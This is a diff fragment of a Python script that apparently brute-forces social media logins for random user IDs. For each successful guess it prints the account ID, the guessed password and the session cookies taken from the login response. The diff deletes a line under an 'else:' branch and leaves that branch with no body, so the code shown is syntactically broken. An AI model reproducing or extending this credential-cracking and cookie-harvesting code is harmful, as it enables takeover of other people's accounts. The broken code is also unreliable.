@@ -112,7 +112,6 @@ def rndm(ids,mking_pass):
 				uid = coki[7:22]
 				if uid in oks:pass
 				else:
-				uid = po['uid']
 				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
 				print('\r\r\033[1;32m [Saadat-OK] '+str(uid)+' | '+pas+'\033[1;97m')
 				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
